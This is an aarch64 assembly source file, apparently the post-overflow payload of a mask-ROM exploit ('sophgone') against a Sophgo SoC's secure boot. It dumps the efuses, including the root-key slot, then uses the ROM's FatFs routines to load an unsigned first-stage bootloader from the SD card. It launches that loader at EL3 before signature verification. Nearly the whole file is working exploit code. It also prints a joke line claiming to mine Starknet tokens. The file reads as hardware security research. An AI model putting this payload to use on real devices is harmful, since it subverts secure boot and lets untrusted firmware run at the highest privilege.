// sophgone aarch64 chainloader stub, in-place (approach B). Reached from the overflow via
// the polyglot word (`b #444` -> 0x1DC), runs at aa_body (0x40120000, above any real FSBL),
// reopens the SD via the mask ROM's FatFs, loads 0:sophg.1aa (fallback 0:sophg.1) as a fip,
// and launches its BL2, all pre-verify.
//
// sophg.1 stays the open file across the launch, so the FSBL also pulls its second stage
// (param2, BLCP_2ND, MONITOR, LOADER_2ND) from it via the ROM's load_image (f_lseek+f_read
// on the default FIL). sophg.1 is plaintext where fip.bin may be the signed+encrypted
// graft; falls back to fip.bin if sophg.1 has no param2.
//
// Output goes through the ROM printf (0x400011fc; %s/%x, varargs x1-x7), which preserves
// x19-x28, so chainloader state survives (x19 FIL, x22 chosen-name, x23/x24 efuse, x24-27
// fip fields, x28 prime offset).
    .include "sophgone-syms-aa.inc"

    .equ PARAM1_SIZE, 0x1000
    .equ OFF_BLCP_SZ, 0xC4
    .equ OFF_BL2_SZ,  0xD8
    .equ OFF_P2LA,    0xE0                  // param2_loadaddr field in param1
    .equ FIPBIN_P2LA, PARAM1_SIZE + BL2_TOTAL
    .equ FA_READ,     0x01
    .equ CVLD_MAGIC,  0x444C5643          // "CVLD", fip param2 header magic ("CVLD02\n")
    .equ HDR_BUF,   SPARE_WINDOW + 0x4000
    .equ BR_BUF,    SPARE_WINDOW + 0x4800
    .equ STACK_TOP, SPARE_WINDOW + 0x8000
    .equ EFUSE_BASE,  0x03050100
    .equ EFUSE_END,   0x03050400           // 0x300 window: config shadow + root_pk hash slot (0x348)

    .section .text
    .globl _start
_start:

    .org AA_STUB_OFF                        // 0x1DC, polyglot word `b #444` lands here
aa_tramp:
    b       aa_body

    .org AA_BODY_OFF                        // 0x20000, in-place body (above any real FSBL)
aa_body:
    ldr     x0, =STACK_TOP
    mov     sp, x0                          // printf needs a stack (160B frame)
    // ---- PWNED.: caps the mask ROM's terse log line ----
    adr     x0, s_pwned
    bl      _printf
    // ---- banner (ROM printf; %s = arch / quote / chip / mode) ----
    adr     x0, banner
    adr     x1, s_arch
    adr     x2, s_quote
    adr     x3, s_chip
    adr     x4, s_mode
    bl      _printf
    // ---- efuse dump [0x03050100, EFUSE_END): config shadow + root_pk SHA-256 slot
    //      @0x03050348 (all zero on this SCS=0 part). All-zero lines skipped; 8 words/line
    //      plus an address column; one %x per nibble (ROM printf has no %-width); subs/b.ne
    //      stay adjacent (printf clobbers NZCV). Regs (survive printf): x23 cursor, x24 end,
    //      x25 count, x26 shift/scan-word, x27 word/scan-cursor, x28 OR-accumulator. ----
    adr     x0, s_efuse_h
    bl      _printf
    ldr     x23, =EFUSE_BASE
    ldr     x24, =EFUSE_END
.Lel:                                       // per line: OR its 8 words, skip the line if all zero
    mov     x28, xzr
    mov     x27, x23
    mov     x25, #8
.Lps:
    ldr     w26, [x27], #4
    orr     x28, x28, x26
    subs    x25, x25, #1
    b.ne    .Lps
    cbz     x28, .Lskip
    mov     w1, w23                        // address column
    adr     x0, s_efuse_a
    bl      _printf
    mov     x25, #8
.Lew:
    ldr     w27, [x23], #4
    adr     x0, s_efuse_w                  // " " before each word
    bl      _printf
    mov     x26, #28                        // most-significant nibble first
.Len:
    lsr     w1, w27, w26
    and     w1, w1, #0xf
    adr     x0, s_nib                      // "%x", one hex digit per nibble
    bl      _printf
    subs    x26, x26, #4
    b.ge    .Len
    subs    x25, x25, #1
    b.ne    .Lew
    adr     x0, s_nl
    bl      _printf
    b       .Lnx
.Lskip:
    add     x23, x23, #32                   // 8 all-zero words -> next line
.Lnx:
    cmp     x23, x24
    b.lo    .Lel
    adr     x0, s_nl
    bl      _printf
    // ---- open the FSBL: 0:sophg.1aa then 0:sophg.1 (x22 = chosen name for %s) ----
    ldr     x19, =FIL_DEFAULT               // surviving default FIL (volume stays mounted)
    adr     x22, name_aa
    mov     x1, x22
    bl      _open
    cbz     w0, opened
    adr     x22, name_gen
    mov     x1, x22
    bl      _open
    cbz     w0, opened
    adr     x0, s_nofip
    bl      _printf
    adr     x0, s_fail
    bl      _printf
2:  b       2b
opened:
    adr     x0, s_chain                     // "[+] chainloaded %s"
    mov     x1, x22
    bl      _printf
    // ---- read sophg.1's full param1 (0x1000) INTO fip_param ----
    mov     x0, x19
    ldr     x1, =FIP_PARAM
    mov     w2, #PARAM1_SIZE
    ldr     x3, =BR_BUF
    ldr     x8, =F_READ
    blr     x8
    ldr     x24, =FIP_PARAM
    // f_read DMA'd sophg.1's param1 over the ROM's fip.bin copy in the same buffer.
    // Invalidate the four lines over [0x00,0x100) (BLCP_SZ, BL2_SZ, P2LA live there) so we
    // and the launched FSBL read the DMA'd bytes. ivac, not civac: a clean would push the
    // stale line back over the DMA'd data.
    dc      ivac, x24
    add     x0, x24, #0x40
    dc      ivac, x0
    add     x0, x24, #0x80
    dc      ivac, x0
    add     x0, x24, #0xC0
    dc      ivac, x0
    dsb     sy
    ldr     w25, [x24, #OFF_BLCP_SZ]        // BLCP_IMG_SIZE
    ldr     w26, [x24, #OFF_BL2_SZ]         // BL2_IMG_SIZE
    ldr     w27, [x24, #OFF_P2LA]           // sophg.1's own param2 offset, kept (not patched)
    add     x25, x25, #PARAM1_SIZE          // bl2_off = 0x1000 + blcp_size
    // ---- seek to the BL2 and DMA it to BL2_BASE ----
    mov     x0, x19
    mov     x1, x25
    ldr     x8, =F_LSEEK
    blr     x8
    mov     x0, x19
    ldr     x1, =BL2_BASE
    mov     w2, w26                         // bl2_size
    ldr     x3, =BR_BUF
    ldr     x8, =F_READ
    blr     x8
    adr     x0, s_fsbl                      // "[+] FSBL staged at 0x%x, caches flushed"
    ldr     x1, =BL2_BASE
    bl      _printf
    // ---- cache maintenance over [BL2_BASE, BL2_BASE+bl2_size): dc civac + ic iallu ----
    ldr     x0, =BL2_BASE
    add     x1, x0, x26
    bic     x2, x0, #63
1:  dc      civac, x2
    add     x2, x2, #64
    cmp     x2, x1
    b.lo    1b
    dsb     sy
    ic      iallu
    isb
    // ---- keep sophg.1 as the open file ----
    // load_image (0x4000197c) dispatches SD-FAT to f_lseek + f_read on the default FIL
    // (read_wrapper 0x400058f8), so the FSBL pulls param2/BLCP_2ND/MONITOR/LOADER_2ND from
    // whatever f_open touched last. Reopen the chainloaded file (x22), not fip.bin:
    // sophg.1's second stage is plaintext, while fip.bin's is signed (and AES-encrypted at
    // SCS=02), which this FSBL cannot decrypt (dec_verify_image is a stub return 0). The
    // .Lp2bad fallback below covers a sophg.1 that carries no second stage.
    mov     x1, x22
    bl      _open
    // ---- prime + validate ----
    // load_image's first read after the overflow returns stale cluster-chain bytes and the
    // second is correct, so do both, then check param2's CVLD magic.
    adr     x0, s_prime
    mov     x1, x22
    bl      _printf
    mov     w28, w27
    bl      _prime                          // throwaway: repairs the FatFs cluster cache
    bl      _prime                          // ... and the good read
    adr     x0, s_nl                        // close the framed line
    bl      _printf
    ldr     x0, =HDR_BUF
    dc      ivac, x0                        // load_image DMA'd it; drop stale lines
    dsb     sy
    ldr     w1, [x0]
    mov     w2, #(CVLD_MAGIC & 0xFFFF)
    movk    w2, #(CVLD_MAGIC >> 16), lsl #16
    cmp     w1, w2
    b.eq    .Lp2ok
    // ---- fallback: this sophg.1 carries no second stage -> send the FSBL to fip.bin --
.Lp2bad:
    adr     x0, s_p2bad
    mov     x1, x22
    bl      _printf
    adr     x1, name_fipbin
    bl      _open
    ldr     w0, =FIPBIN_P2LA
    str     w0, [x24, #OFF_P2LA]            // FIP_PARAM[+0xE0] = 0x1000 + overflow_BL2
    add     x1, x24, #OFF_P2LA
    bic     x1, x1, #63                     // clean the patched line to memory
    dc      civac, x1
    dsb     sy
    adr     x0, s_prime
    adr     x1, name_fipbin
    bl      _printf
    ldr     w28, =FIPBIN_P2LA               // 0x3F400
    bl      _prime
    adr     x0, s_nl
    bl      _printf
.Lp2ok:
    // waste some time
    adr     x0, s_stark
    bl      _printf
    eor     x0, x0, x0
    mov     x1, #28438
.Lstark:
    cmp     x1, x0
    bge     .Lstark_end
    add     x1, x1, 1
    b       .Lstark
.Lstark_end:
    // ---- report the secure-boot config from efuse word 0x030501a0 ----
    // [3:2]=signature (SCS) mode, [7:6]=image-encryption mode, [22:20]=root-key slot.
    // One arg per line: the ROM printf is not reliably multi-vararg.
    ldr     x9, =0x030501a0
    ldr     w1, [x9]
    adr     x0, s_scs_raw
    bl      _printf
    ldr     x9, =0x030501a0
    ldr     w1, [x9]
    ubfx    w1, w1, #2, #2
    adr     x0, s_scs_sig
    bl      _printf
    ldr     x9, =0x030501a0
    ldr     w1, [x9]
    ubfx    w1, w1, #6, #2
    adr     x0, s_scs_enc
    bl      _printf
    ldr     x9, =0x030501a0
    ldr     w1, [x9]
    ubfx    w1, w1, #20, #3
    adr     x0, s_scs_key
    bl      _printf
    // ---- launch sophg.1's BL2 ----
    adr     x0, s_launch
    bl      _printf
    adr     x0, s_success
    bl      _printf
    ldr     x0, =BL2_ENTRY                  // 0x40100020
    br      x0

// _printf(x0=fmt, x1..=args): call the ROM printf; it preserves x19-x28.
_printf:
    stp     x29, x30, [sp, #-16]!
    ldr     x8, =PRINTF
    blr     x8
    ldp     x29, x30, [sp], #16
    ret

// _prime(w28=byte offset): ROM load_image(HDR_BUF, w28, PARAM1_SIZE, media_hi=0). It
// prints "SD/<off>/0x1000/0x1000/0." itself, landing inline in the caller's framed line.
_prime:
    stp     x29, x30, [sp, #-16]!
    ldr     x0, =HDR_BUF
    mov     w1, w28
    mov     w2, #PARAM1_SIZE                // 0x1000
    mov     w3, #0                          // media_hi
    ldr     x8, =LOAD_IMAGE                 // 0x4000197c
    blr     x8
    ldp     x29, x30, [sp], #16
    ret

// _open(x1=path): f_open(FIL, path, FA_READ) -> w0=FRESULT (0==FR_OK)
_open:
    stp     x29, x30, [sp, #-16]!
    mov     x0, x19
    mov     w2, #FA_READ
    ldr     x8, =F_OPEN
    blr     x8
    ldp     x29, x30, [sp], #16
    ret

    .align 3
name_aa:  .asciz "0:sophg.1aa"
name_gen: .asciz "0:sophg.1"
name_fipbin: .asciz "0:fip.bin"
s_arch:   .asciz "aarch64"
s_chip:   .asciz "A53 "
s_mode:   .asciz "EL3 TrustZone"
s_quote:  .asciz "\"You know, I always thought a failsafe system was supposed\n   to be somewhat safe. From failure.\" - Jack O'Neill"
s_pwned:  .asciz "PWNED.\n"
s_efuse_h: .asciz "  efuses:\n"
s_efuse_a: .asciz "  0x%x:"     // per-line address column (%x -> no leading zeros, fine)
s_efuse_w: .asciz " "          // one space before each zero-padded word
s_nib:     .asciz "%x"         // ROM printf: bare %x only (no %-width); one hex digit per nibble
s_nl:     .asciz "\n"
s_chain:  .asciz "[+] chainloaded %s\n"
s_fsbl:   .asciz "[+] FSBL staged at 0x%x, caches flushed\n"
s_prime:  .asciz "[-] priming %s to flush garbage from overflow: "
s_p2bad:  .asciz "[!] %s has no param2 (no second stage) -- falling back to 0:fip.bin\n"
s_stark:   .asciz "[*] mining Starknet tokens\n"
s_scs_raw: .asciz "[*] secure-boot fuse 0x030501a0 = 0x%x\n"
s_scs_sig: .asciz "[*]   signature verify (SCS): %x\n"
s_scs_enc: .asciz "[*]   image encryption:       %x\n"
s_scs_key: .asciz "[*]   root-key slot:          %x\n"
s_launch:  .asciz "[+] launching image without secure boot\n"
s_nofip:  .asciz "[!] no sophg.1 or sophg.1aa on storage device\n"
s_success: .asciz "\nChevron seven... locked!\n"
s_fail: .asciz "\nChevron seven... will not lock.\n"
    .align 3
banner:
    .incbin "sophgone-boot-banner.txt"
    .byte 0
    .ltorg
aa_end:
